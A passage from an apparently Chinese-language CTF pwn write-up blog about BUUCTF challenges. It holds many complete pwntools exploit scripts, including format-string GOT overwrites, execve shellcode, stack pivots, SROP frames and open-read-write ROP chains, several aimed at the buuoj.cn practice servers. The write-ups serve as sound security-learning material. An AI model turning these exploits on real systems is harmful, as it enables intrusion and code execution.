payload2 = 'a' + p32(strlen_got_addr) + p32(strlen_got_addr + 2) + '%' + str(system_low_addr - 18) + 'c%8$hn' + '%' + str(system_high_addr - system_low_addr) + 'c%9$hn'
print("length:" + str(len(payload2)))
p.sendline(payload2)
p.recvuntil("Please tell me:")
p.sendline(';/bin/sh')
p.interactive()
```

# axb_2019_fmt64

有一个坑点

由于这次是64位程序，**发送8字节地址时高位必定为0**，如下图，导致在sprintf时发生了截断。也就是说格式化字符串并没有接收到在后面发送的`%8$s`，所以这次把`%8$s`放在前面发送，显然，要改成'%9$s'并加以适当的填充。

![image-20210418010221687](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041740639.png)

改正后：

![image-20210418010828561](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041741729.png)

另外，不知道为什么在打远端时，无法泄露printf的真实地址，这一点也与上题不同，所以本题采用泄露puts的真实地址来计算libc的基地址(顺便一提也无法泄露strlen的真实地址，难受)

system的真实地址有8字节，即使能拆成两半分两次写入四字节，也是非常慢的（这是我之前的写法，会报错），但由于system和strlen在同一个libc中，所以两者真实地址的高字节部分是一样的，我们可以打印出puts的真实地址来验证

![image-20210418164119314](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041741244.png)

可以看到低位的三个字节不同，因此可以只改strlen的低三个字节为system的低三个字节

写exp时，还有一点要注意，因为system_high_addr - 9可能为两位数也可能为3位数（可以自己验证），所以payload2前部分的长度是不确定（可能是24也可能是25，亲自验证）的，故我们需要使用ljust将payload2的前半部分填充至32字节（8的倍数），再在后面加上strlen的got表地址，注意在strlen_got_addr处写入两字节，在strlen_got_addr+2处写入一字节。

exp如下：

```
from pwn import*
context(arch = 'amd64', os = 'linux', log_level = 'debug')
p = remote('node3.buuoj.cn', 28992)
#p = process('./pwn')
e = ELF('./pwn')
puts_got_addr = e.got['puts']
strlen_got_addr = e.got['strlen']
p.recvuntil("Please tell me:")
payload1 = b'%9$saaaa' + p64(puts_got_addr)
p.sendline(payload1)
puts_true_addr = u64(p.recvuntil("\x7f")[-6:].ljust(8,'\x00'))
print("puts_addr:" + hex(puts_true_addr))
libc = ELF('./libc-2.23.so')
libc_base_addr = puts_true_addr - libc.symbols['puts']
system_true_addr = libc_base_addr + libc.symbols['system']
print("system_addr:" + hex(system_true_addr))
system_low_addr = system_true_addr & 0xffff
system_high_addr = (system_true_addr >> 16) & 0xff
print("system_low_addr:" + hex(system_low_addr))
print("system_high_addr:" + hex(system_high_addr))
"""
system_addr:0x7fbb04e1c7a0
system_low_addr:0xc7a0
system_high_addr:0xe1
"""
p.recvuntil("Please tell me:")
payload2 = '%' + str(system_high_addr - 9) + 'c%12$hhn' + '%' + str(system_low_addr - system_high_addr) + 'c%13$hn'
payload2 = payload2.ljust(32,'a') + p64(strlen_got_addr + 2) + p64(strlen_got_addr)
p.sendline(payload2)
p.recvuntil("Please tell me:")
p.sendline(';/bin/sh')
p.interactive()
```

# pwnable_start

因为一个回车，调试了两个小时……真的服了，决定以后尽量用send而不是sendline

没有main函数，只有start，纯汇编。F5还不如看汇编。

![image-20210419165835047](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041741548.png)

![image-20210419165753744](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041741830.png)

如上图，先输出一句提示，然后从栈顶开始读入60个字节，但栈大小只有20字节，明显溢出了。没开NX，必然是ret2shellcode。但是我们需要知道shellcode写入的地址，才能跳转到shellcode

由于在start时首先push了esp，所以在返回地址下方其实就有栈地址，如下图，而且这个esp+4处保存的栈地址(0xffa8bd90)其实就是esp+8的值

![image-20210419170306702](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041741739.png)

我们可以通过第一次溢出使其返回至write函数，打印出这个地址，之后再次输入时，就是从0xffa8bd8c开始保存了

```
from pwn import *
context(arch = 'i386', os = 'linux', log_level = 'debug')
p = process('./pwn')
p.recvuntil("Let's start the CTF:")
payload1 = b'a' * 20 + p32(0x08048087)
p.send(payload1)
stack_addr = u32(p.recvuntil("\xff")[-4:])
shellcode = asm("""
push 0x68
push 0x732f2f2f
push 0x6e69622f
mov ebx,esp
xor ecx,ecx
xor edx,edx
push 11
pop eax
int 0x80
""")
payload2 = b'a' * 20 + p32(stack_addr + 20) + shellcode
p.send(payload2)
p.interactive()
```

payload1发送时，写成了sendline，多出来的回车(0xa)覆盖了那个栈地址的最低位……调试良久后，终于发现了原因，痛心啊

# ciscn_2019_s_4

![image-20210421004709386](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041741690.png)

溢出大小仅为8，也就是仅能覆盖返回地址，不能构造很长的ROP链，必然是栈迁移

栈迁移，是做过的题型，但仍然不是很熟练，于是记录之

前几次做的栈迁移都是将栈迁移至bss段，但此题并不能迁移到bss段，因为没有向bss段写入的函数，好在上图中第一次printf可以泄露出栈地址（ebp），我们可以通过动态调试找出这个地址和我们输入的内容之间的偏移，从而知道我们输入的东西放在栈上什么地方，然后在第二次read时改变ebp，使得函数结束栈顶指针指向我们构造好的栈顶处，并执行我们想要他执行的函数。栈迁移原理详解见上面某篇题解。

如下图，随便输入个1234，计算出偏移为0xffffd008 - 0xffffcfd0 = 0x38

![image-20210421004509293](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041741602.png)

exp如下：

```
from pwn import *
context(arch = 'i386', os = 'linux', log_level = 'debug')
#p = process('./pwn')
p = remote('node3.buuoj.cn', 29774)
e = ELF('./pwn')
system_plt_addr = e.plt['system']
p.recvuntil('name?\n')
payload1 = b'a' * 40
p.send(payload1)
p.recv(47)
previous_ebp = u32(p.recv(4))
stack_addr = previous_ebp - 0x38
print("stack_addr:" + hex(stack_addr))
p.recvuntil("\n")
bin_sh_addr = stack_addr + 12
leave_ret_addr = 0x080484b8
payload2 = p32(system_plt_addr) + p32(0xdeadbeef) + p32(bin_sh_addr) +'/bin/sh'
payload2 = payload2.ljust(40, '\x00') + p32(stack_addr - 4) + p32(leave_ret_addr)
p.send(payload2)
p.interactive()
```

# wustctf2020_closed

![image-20210421160151103](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041741170.png)

close(1)和close(2)是什么意思？

我们知道close用于关闭已经打开的文件，而1和2是linux下的**文件描述符**。

在Linux中一切皆文件，文件描述符（file descriptor）是内核为了高效管理已被打开的文件所创建的索引，是一个非负整数（通常是小整数），用于指代被打开的文件，所有执行I/O操作的系统调用都通过文件描述符。**0、1、2是三个文件描述符，分别表示标准输入文件stdin（获取从键盘输入的数据），标准输出文件stdout（将数据显示到屏幕上），标准错误输出文件stderr（将报错显示到屏幕上），在程序开始运行时，这三个文件自动打开并分别使用各自的文件描述符。**如果此时去**打开一个新的文件，它的文件描述符会是3。**

标准输入输出的指向是默认的，我们可以修改它们的指向，也即重定位

举例子，可以用exec 1>myoutput把标准输出重定向到myoutput文件中，也可以用exec 0<myinput把标准输入重定向到myinput文件中，而且，**文件名字可以用&+文件描述符来代替。**

所以，**close(1);close(2)即把标准输出和标准错误输出关闭**，然后我们可以执行 **exec 1>&0，也就是把标准输出重定向到标准输入**，因为**默认打开一个终端后，0，1，2都指向同一个位置也就是当前终端**，所以这条语句相当于重启了标准输出，此时就可以执行命令并且看得到输出了

更详细的介绍可见https://blog.csdn.net/xlinsist/article/details/51147212

![image-20210421161356582](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041742224.png)

# npuctf_2020_level2

第一次做非栈上的格式化字符串题目，检查保护，除了canary都开了

![image-20210422172755880](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041742728.png)

主函数就是这么简单：

![image-20210422172913838](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041742930.png)

当输入几个6后，程序退出，否则可以无限利用格式化字符串漏洞。这种题目的解法有三种：

**1.通解是改printf的got表中的地址为system的真实地址，然后输入'/bin/sh'执行system('/bin/sh')**

**2.其次是改printf的got表中的地址为one_gadget的地址**

**3.再次是改ret地址中的libc_start_main地址为one_gadget地址**

因为RELRO保护全开，所以前两种办法失效了，只能用第三种

那，怎么才能改程序的返回地址为one_gadget呢？

![image-20210422184345981](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041742881.png)

首先，需要知道libc的基地址，这需要我们泄露栈上的某一个libc地址，如下图，程序的返回地址就是libc中的某一个地址，且是格式化字符串的第七个参数

![image-20210422181821606](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041742784.png)

因为输入的内容全都在bss段，我们不能通过'%n'来改变我们输入的任意地址的值，但我们可以通过间接的方式来改变。接下来我们需要**地址链**来完成攻击。通常地址链由三个栈空间的地址组成。如下图

![image-20210422183254690](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041742849.png)

常用的地址链有：rbp指针链、args参数链
（如果利用rbp指针链进行攻击，注意最后退出函数的时候，需要把rbp指针链恢复为原始状态。）

![image-20210422183424934](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041742429.png)

我们可以通过格式化字符串漏洞将0x7fffffffde78（第九个参数，地址为0x7fffffffdda8）指向的0x7fffffffe1c4改为0x7fffffffdd98，再通过此漏洞将第三十五个参数（地址为0x7fffffffde78）0x7fffffffdd98指向的的返回地址(最低)两个字节改为one_gadget地址的低两个字节，再将0x7fffffffdd98改成0x7fffffffdd9c，再将第三十五个参数（地址为0x7fffffffde78）0x7fffffffdd9c指向的返回地址(次低)两个字节改为one_gadget地址的高两个字节

上面说的非常绕，借用其他博主的图，更好理解，动手调试当然是坠吼的

第一步：

```
payload = "%" + str(low_retn) + "c%9$hn...."
```

![image.png](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041743864.png)

第二次：

```
payload = "%" + str(low_onegadget) + "c%35$hn...."
```

![image.png](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041745564.png)

第三步：

```
payload = "%" + str(hign_retn) + "c%9$hn...."
```

![image.png](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041746620.png)

第四步：

```
payload = "%" + str(hign_onegadget) + "c%35$hn...."
```

![image.png](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041746369.png)

所以，我们需要知道的值为原来的返回地址(0x7ffff7a03bf7 (__libc_start_main+231))和该地址在栈中的地址(0x7fffffffdd98，即返回时rsp寄存器中的值)，后者可以通过动态调试和泄露**栈上**的地址算出偏移后得到，偏移为0xde78 - 0xdda8 = 0xe0

exp如下：

```
from pwn import *
context(arch = 'amd64', os = 'linux', log_level = 'debug')
p = remote('node3.buuoj.cn', 28365)
#p = process('./pwn')
e = ELF('./pwn')
libc = ELF('./libc-2.27.so')
payload1 = '%7$p%9$p'
p.send(payload1)
__libc_start_main_231 = int(p.recv(14), 16)
libc_base_addr = __libc_start_main_231 - 231 - libc.symbols['__libc_start_main']
leak_stack_addr = int(p.recv(14), 16)
ret_esp = leak_stack_addr - 0xe0
one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
onegadget_addr = libc_base_addr + one_gadget[0]
retaddr_low2addr = ret_esp & 0xffff
retaddr_high2addr = (ret_esp + 2) & 0xffff #retaddr_low2addr + 4
onegadget_addr_low_2_bytes = onegadget_addr & 0xffff
onegadget_addr_high_2_bytes = (onegadget_addr >> 16) & 0xffff
print("ret_esp:" + hex(ret_esp))
print("retaddr_low2addr:" + hex(retaddr_low2addr))
print("retaddr_high2addr:" + hex(retaddr_high2addr))
print("one_gadget_addr:" + hex(onegadget_addr))
print("one_gadget_addr_low_2_bytes:" + hex(onegadget_addr_low_2_bytes))
print("one_gadget_addr_high_2_bytes:" + hex(onegadget_addr_high_2_bytes))

payload2 = '%' + str(retaddr_low2addr) + 'c%9$hn....'
p.sendline(payload2)

payload3 = '%' + str(onegadget_addr_low_2_bytes) + 'c%35$hn....'
p.sendlineafter("....", payload3)

payload4 = '%' + str(retaddr_high2addr) + 'c%9$hn....'
p.sendlineafter("....", payload4)

payload5 = '%' + str(onegadget_addr_high_2_bytes) + 'c%35$hn....'
p.sendlineafter("....", payload5)

p.sendlineafter("....", "66666666\x00")
p.interactive()
```

# ciscn_2019_sw_1

栈上的格式化字符串漏洞，但是只能用一次，不能用多了

重温目前已知的解法：

**1.改got表，通常是改printf在got表中的真实地址为system_plt(这题给了后门函数，否则也需要泄露libc地址来计算system的地址)，再发送'/bin/sh\x00'**

**2.改got表/返回地址为one_gadget（需要泄露libc地址计算基址）**

**3.改malloc_hook为one_gadget，让printf输出大量字符触发malloc（同样要泄露libc地址计算基址）**

无论何种解法，只用一次printf肯定是不够的，怎么多次利用呢？

![image-20210423124226845](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041746995.png)

main函数在程序**执行后都会进入fini_array**

![img](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041746463.png)

![image-20210423131159252](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041746860.png)

简单地说，在main函数前会调用.init段代码和`.init_array`段的函数数组中每一个函数指针（从0到n）。同样的，main函数结束后也会调用.fini段代码和`.fini._arrary`段的函数数组中的每一个函数指针（从n到0）。

而我们的目标就是修改**.fini_array数组的第一个元素为start或者main函数地址**。需要注意的是，只能重新执行一次main函数，而不能无限循环。原因见下：

首先，在IDA中可以通过ctrl+s看到各个段的地址

![image-20210423131034287](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041746070.png)

![image-20210423131232360](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041746872.png)

![image-20210423131833596](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041746460.png)

![image-20210423131859275](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041746953.png)

原理就是这样，劫持.fini_array数组，使我们能够再次执行main函数。由于执行次数的限制(2次)，所以我们需要一次性修改fini_array和printf_got，第二次main函数时getshell

解题过程记录如下：

先随便输入一个11，如下图，可见输入内容为格式化字符串第四个参数

![image-20210423175156222](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041746782.png)

exp如下：

```
from pwn import *
context(arch = 'i386', os = 'linux', log_level = 'debug')
#p = process('./pwn')
e = ELF('./pwn')
p = remote('node3.buuoj.cn', 27517)
p.recvuntil("Welcome to my ctf! What's your name?\n")
fini_array = 0x0804979C
main_addr = 0x08048534
system_plt_addr = e.plt['system']
printf_got_addr = e.got['printf']
main_addr_low_bytes = main_addr & 0xffff
main_addr_high_bytes = (main_addr >> 16) & 0xffff
system_plt_low_bytes = system_plt_addr & 0xffff
system_plt_high_bytes = (system_plt_addr >> 16) & 0xffff
print("main_addr:" + hex(main_addr))
print("main_addr_low_bytes:" + hex(main_addr_low_bytes))
print("main_addr_high_bytes:" + hex(main_addr_high_bytes))
print("system_plt_addr:" + hex(system_plt_addr))
print("system_plt_low_bytes:" + hex(system_plt_low_bytes))
print("system_plt_high_bytes:" + hex(system_plt_high_bytes))
"""
main_addr_low_bytes:0x8534
main_addr_high_bytes:0x804
system_plt_low_bytes:0x83d0
system_plt_high_bytes:0x804
"""
payload1 = p32(fini_array + 2) + p32(printf_got_addr + 2) + p32(printf_got_addr) + p32(fini_array)
payload1 += '%' + str(main_addr_high_bytes - 0x10) + 'c%4$hn' + '%5$hn' + '%' + str(system_plt_low_bytes - 0x804) + 'c%6$hn' + '%' + str(main_addr_low_bytes - 0x83D0) + 'c%7$hn....'
p.sendline(payload1)
p.sendlineafter("....", '/bin/sh\x00')
p.interactive()
```

上面的exp中，payload采用了按顺序改的方式，即先printf 0x804字节改变两个地址，再printf (0x83d0 - 0x804)字节改变另一个，再printf (0x8534 - 0x83d0)字节改变最后一个。如果不按这个顺序，怎么办呢？

也就是说，假设已经printf了0x8534个字节改变了fini_array[0]的低地址，现在想要printf 0x804个字节来改变它的高地址，可是首次printf的字节数已经大于了第二次想要printf的字节数，怎么办？

**可以使它printf的字节数为"负"。**第一次printf了0x8534个字节，则第二次printf - 0x8534 + 0x804个字节，而 - 0x8534 = 0x10000 - 0x8534（补码相关知识，正如同两字节 -1 = 0xffff）所以第二次printf 0x10000 + 0x804 - 0x8534 个字节，也就是 0x10804 - 0x8534 字节

exp如下：

```
from pwn import *
context(arch = 'i386', os = 'linux', log_level = 'debug')
#p = process('./pwn')
e = ELF('./pwn')
p = remote('node3.buuoj.cn', 27517)
p.recvuntil("Welcome to my ctf! What's your name?\n")
fini_array = 0x0804979C
main_addr = 0x08048534
system_plt_addr = e.plt['system']
printf_got_addr = e.got['printf']
main_addr_low_bytes = main_addr & 0xffff
main_addr_high_bytes = (main_addr >> 16) & 0xffff
system_plt_low_bytes = system_plt_addr & 0xffff
system_plt_high_bytes = (system_plt_addr >> 16) & 0xffff
print("main_addr:" + hex(main_addr))
print("main_addr_low_bytes:" + hex(main_addr_low_bytes))
print("main_addr_high_bytes:" + hex(main_addr_high_bytes))
print("system_plt_addr:" + hex(system_plt_addr))
print("system_plt_low_bytes:" + hex(system_plt_low_bytes))
print("system_plt_high_bytes:" + hex(system_plt_high_bytes))
"""
main_addr_low_bytes:0x8534
main_addr_high_bytes:0x804
system_plt_low_bytes:0x83d0
system_plt_high_bytes:0x804
"""
payload = p32(fini_array) + p32(fini_array + 2) + p32(printf_got_addr) + p32(printf_got_addr + 2)
payload += "%" + str(main_addr_low_bytes - 16) + "c%4$hn"
payload += "%" + str(0x10000 - main_addr_low_bytes + main_addr_high_bytes) + "c%5$hn"
payload += "%" + str(system_plt_low_bytes - main_addr_high_bytes) + "c%6$hn"
payload += "%" + str(0x10000 - system_plt_low_bytes + system_plt_high_bytes) + "c%7$hn"
p.sendline(payload)
p.sendlineafter("name?\n", '/bin/sh\x00')
p.interactive()
```

# 0ctf2016-warmup

考点：**alarm在rop中的妙用**

先检查保护

![image-20210424212533523](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041746361.png)

在ida中已经重命名各个函数，start函数就是这么简单，没有main函数，应该是用汇编写的

![image-20210424212145771](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041747078.png)

vul函数中存在明显的栈溢出，但是本题的read、write函数都是用系统调用实现的，根本没有用到libc，**只能通过系统调用的open函数打开flag文件读取内容发并输出**

![image-20210424212254368](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041747734.png)

查阅系统调用表可知open函数的系统调用号为5，可是整个程序没有专门给eax寄存器赋值为5的指令，怎么办？

**alarm函数有一个特性，如果多次调用alarm，那么后一个alarm就会返回前一个alarm开始到现在还剩下多长时间。比如，第一次alarm(10)，然后过来2s，我们又调用alarm(1234)，那么第二次的alarm返回值eax为10s-2s=8s。**

程序中alarm(0xA)，因此，我们只需要休眠5s（假设休眠前所有操作在0.1s内完成，那么休眠4.9s）然后再调用一次alarm，就可以使得eax的值为5，从而构造open系统调用，注意**open函数这里只能以只读方式**（第二个参数为0）**打开flag文件**（以其他方式打不开服务器上的文件，可能权限不够），**所以其第二个参数为0（一般O_RDONLY 定义为0，O_WRONLY定义为1，O_RDWR定义为2）即sys_open(file,0,0);调用号为5**，因为不存在创建新文件的过程（第三个参数仅当创建新文件时，也就是第二个参数为O_CREAT 时才需要指定，O_CREAT：如果指定文件不存在，则创建这个文件再使用），所以open函数不需要指定第三个参数，当然你指定了也没事。

```
from pwn import *
context(arch = 'i386', os = 'linux', log_level = 'debug')
#p = process('./pwn')
p = remote('node3.buuoj.cn', 25737)
p.recvuntil("Welcome to 0CTF 2016!\n")
start = 0x080480D8
read = 0x0804811D
buf = 0x080491BC
write = 0x08048135
alarm = 0x0804810D
set_ebx_ecx_edx = 0x0804813A
# read the path
payload1 = b'a' * 32 + p32(read) + p32(start) + p32(0) + p32(buf)+ p32(100)
p.send(payload1)
p.recvuntil("Good Luck!\n")
p.send('flag\x00')
# open the path
time.sleep(4.9)
payload2 = b'a' * 32 + p32(alarm) + p32(set_ebx_ecx_edx) + p32(start) + p32(buf) + p32(0)
p.send(payload2)
p.recvuntil("Good Luck!\n")
# read the file
payload3 = b'a' * 32 + p32(read) + p32(start) + p32(3) + p32(buf) + p32(100)
p.send(payload3)
p.recvuntil("Good Luck!\n")
# write the file
payload4 = b'a' * 32 + p32(write) + p32(0xdeadbeef) + p32(1) + p32(buf) + p32(100)
p.send(payload4)
p.interactive()
```

# [V&N2020 公开赛]babybabypwn

带沙盒的srop

先检查保护，保护全开

![image-20210425201517814](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041747585.png)

使用seccomp-tools查看沙盒ban掉了哪些系统调用，execve赫然在列

![image-20210425201730014](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041747057.png)

查看漏洞函数

![image-20210425201655205](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041747232.png)

没有栈溢出，但是read能帮我们把东西读入到栈顶，发光的syscall(15)很难不让人用SROP

SROP能够帮助我们伪造各寄存器的值，便于我们实现栈迁移，然后构造自己的ROP链，由于不能获得shell(ban掉了execve)，于是构造orw(open-read-write)的ROP链，将flag打开，读取，打印！

那么，栈迁移到哪里？程序的基址是不确定的（开了随机化），因此不知道程序的bss段在哪里，即使不迁移到bss段也不知道具体迁移到那个地方。好在给我们了puts函数的真实地址，我们便可以算出libc的基址，**将栈迁移到libc的bss段上**，同理，我们的gadgets（如pop_rdi_ret之类的）也要用libc里面的

![image-20210425204252531](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041747939.png)

如下图，把libc拖进ida，crtl+s即可看到libc的bss段偏移为0x3c5720

![image-20210425214934992](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041747286.png)

如图，libc的中有一部分是可写的

你可能还会问，为什么构造的signal frame要省去前八个字节？

答案如下：

![image-20210425205354107](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041747793.png)

解释：随便输入一个1234回车，在执行syscall前可以发现**我们输入的内容已经不在栈顶，而在栈顶的rsp+8的位置**

为什么read的时候读入到栈顶的东西此时跑到rsp+8的位置去了？

因为ida F5给我们解析出来的syscall(15)并不是真正的系统调用syscall，而是一个_syscall函数（如下图），在这个函数里面才有真正的系统调用syscall

![image-20210425205554236](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041747744.png)

出题人：想不到吧！真正的syscall在_syscall函数里面！（你坏坏）

![image-20210425205738544](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041747003.png)

因为有call，所以下一条指令的地址被压入了栈，因此栈又往低地址方向增长了8个字节，原来在栈顶的输入内容现在在rsp+8的位置处

可能你还会问：那，为什么要省去前八个字节，还是没有说明白？

因为在执行真正的syscall(15)，亦即sigreturn时，rsp/esp必须要指向我们构造的虚假的signal frame，如果不省去前八个字节，那么rsp并没有指向我们构造的虚假的frame，而是指向了那个被压入栈的返回地址

也许你还会问：那按照你的说法，省去八个字节，rsp指向了虚假的frame，那那个返回地址岂不是成了你构造的虚假的frame的前八个字节？

答案是：确实。但是**前八个字节并不重要**。我们看看我们用pwntools自带的工具构造出的虚假的signal frame的结构：

![img](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041747533.jpeg)

前八个字节其实本来应该是rt_sigreturn的地址，即syscall(15)这条指令的地址，但其实我们并不需要指定这个，因为本来程序就有syscall(15)。因此前八个字节不重要。事实上，如果我们不指定前八个字节，那么我们构造的虚假的frame的前八个字节是\x00

前八个字节真的没有影响吗？我们再来验证一下，就通过这道题[[BUUCTF-Pwn\]刷题记录1 - Ploaris - 博客园 (cnblogs.com)](https://www.cnblogs.com/p0lar1s/p/14573103.html#解法二：（正解）srop攻击)

原来的exp是这样的，syscall时rsp正指向虚假的frame

```
from pwn import *

p = remote('node3.buuoj.cn',28663)
context.binary = './pwn'
#context.terminal = ['gnome-terminal','-x','sh','-c']

main_addr = 0x0004004ED
mov_rax_15_ret = 0x4004DA
syscall_addr = 0x400517

payload1 = '/bin/sh\x00'*2 + p64(main_addr)
p.send(payload1)
p.recv(0x20)
bin_sh_addr =u64(p.recv(8)) - 280

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = bin_sh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr

payload2 = '/bin/sh\x00'*2 + p64(mov_rax_15_ret) + p64(syscall_addr) + str(frame)
p.send(payload2)

p.interactive()
```

改成这样（rsp同样指向虚假的frame，不同之处在于frame的前八个字节是我们瞎写的，那个0x08048450是乱写的一个地址，想表达的意思就是前八个字节随便乱写也没事），同样打得通

```
from pwn import *

p = process('./pwn1')
context(arch = 'amd64', os = 'linux', log_level = 'debug')

main_addr = 0x0004004ED
mov_rax_15_ret = 0x4004DA
syscall_addr = 0x400517

payload1 = '/bin/sh\x00'*2 + p64(main_addr)
p.send(payload1)
p.recv(0x20)
bin_sh_addr =u64(p.recv(8)) - 280

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = bin_sh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr

payload2 = '/bin/sh\x00'*2 + p64(mov_rax_15_ret) + p64(syscall_addr) + p64(0x08048450) + (str(frame)[8:])
p.send(payload2)

p.interactive()
```

那么回归本题，exp如下：

```
from pwn import *
context(arch = 'amd64', os = 'linux', log_level = 'debug')
p = remote('node3.buuoj.cn', 28461)
p.recvuntil("Here is my gift: ")
puts_addr = int(p.recv(14), 16)
libc = ELF('./libc-2.23.so')
libc_base_addr = puts_addr - libc.symbols['puts']
bss = libc_base_addr + 0x3C5720 + 0x500
open_addr = libc_base_addr + libc.symbols['open']
read_addr = libc_base_addr + libc.symbols['read']
write_addr = libc_base_addr + libc.symbols['write']
pop_rdi_ret = libc_base_addr + 0x021102
pop_rdx_rsi_ret = libc_base_addr + 0x01150c9
flag_addr = bss + 0x100
read_buf = bss + 0x500
p.recvuntil("Please input magic message: ")

frame = SigreturnFrame()
frame.rip = read_addr
frame.rsp = bss
frame.rdi = 0
frame.rsi = bss
frame.rdx = 0x200

payload1 = (str(frame)[8:])
p.send(payload1)
#open("flag", 0, 0)
payload2 = p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rdx_rsi_ret) + p64(0) + p64(0) + p64(open_addr)
#read(3, read_buf, 100)
payload2 += p64(pop_rdi_ret) + p64(3) + p64(pop_rdx_rsi_ret) + p64(100) + p64(read_buf) + p64(read_addr)
#write(1, read_buf, 100)
payload2 += p64(pop_rdi_ret) + p64(1) + p64(pop_rdx_rsi_ret) + p64(100) + p64(read_buf) + p64(write_addr)
payload2 = payload2.ljust(0x100, '\x00') + 'flag\x00'
p.send(payload2)
p.interactive()
```

# picoctf_2018_got_shell

很简单一道题，给出了后门函数。之前形成了思维定势想着怎么泄露栈地址来修改返回地址为后门函数。其实不用，修改puts的got表中的真实地址为后门函数的地址即可。

![image-20210427020158833](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041747141.png)

```
from pwn import *
context(arch = 'i386', os = 'linux', log_level = 'debug')
p = remote('node3.buuoj.cn', 29373)
e = ELF('./pwn')
puts_got_addr = e.got['puts']
p.recvuntil("4 byte value?\n")
p.sendline(hex(puts_got_addr))
p.recvuntil("\n")
p.sendline('0x804854B')
p.interactive()
```

# rootersctf_2019_srop

纯汇编，F5还不如看汇编

![image-20210427221116311](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041747936.png)

![image-20210427221139423](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041747221.png)

也是挺简单一题，记录的原因也是刚开始做时陷入了思维定势，觉得非要read进去15字节才能使rax寄存器的值为15，但其实忽略了一个很重要的点，就是程序中有pop rax;这条指令，后面紧邻的就是syscall;

```
from pwn import *
context(arch = 'amd64', os = 'linux', log_level = 'debug')
#p = process('./pwn')
p = remote('node3.buuoj.cn', 25546)
p.recvuntil("Hey, can i get some feedback for the CTF?\n")
read_addr = 0x0401021
pop_rax_syscall = 0x0401032
syscall_leave_ret = 0x0401033
data_addr = 0x402000
bin_sh_addr = data_addr + 0x200

frame1 = SigreturnFrame()
frame1.rax = 0
frame1.rdi = 0
frame1.rsi = data_addr
frame1.rdx = 0x300
frame1.rbp = data_addr - 8
frame1.rip = syscall_leave_ret

payload1 = b'a' * 136 + p64(pop_rax_syscall) + p64(15) + str(frame1)

p.send(payload1)

frame2 = SigreturnFrame()
frame2.rax = constants.SYS_execve
frame2.rdi = bin_sh_addr
frame2.rsi = 0
frame2.rdx = 0
frame2.rip = syscall_leave_ret

payload2 = p64(pop_rax_syscall) + p64(15) + str(frame2)
print(len(payload2))
payload2 = payload2.ljust(0x200, '\x00') + '/bin/sh\x00'
p.send(payload2)

p.interactive()
```

# pwnable_simple_login

非常隐蔽的栈迁移……原理可能很simple，但是从过程上来讲并不simple

先检查保护，除了地址随机化以外都有开启或部分开启

![image-20210429002021225](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041747676.png)

主函数如下，部分变量已经跟据我自己的理解进行了改名

![image-20210429002132913](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041747210.png)

验证函数：

![image-20210429002230518](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041747955.png)

后门函数

![image-20210429002252807](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041747591.png)

具体流程：读入一个字符串并进行base64解码，解码后的长度不能大于12，接着将解码后的字符串复制到bss段上(decoded_str)，在验证函数中，又将bss段上的decoded_str复制到栈中，再计算一个md5值并与内置的md5值相对比。

其实，**md5值并没有卵用，在你将它复制到一个md5解密网站并且不能解密时，你就应该意识到这一点**

一般地，漏洞不会存在于各种加密、解密函数中，**当memcpy函数的长度可控时，一般存在溢出**，此题也没有其他明显的漏洞函数，直觉也提示我漏洞存在于memcpy处。

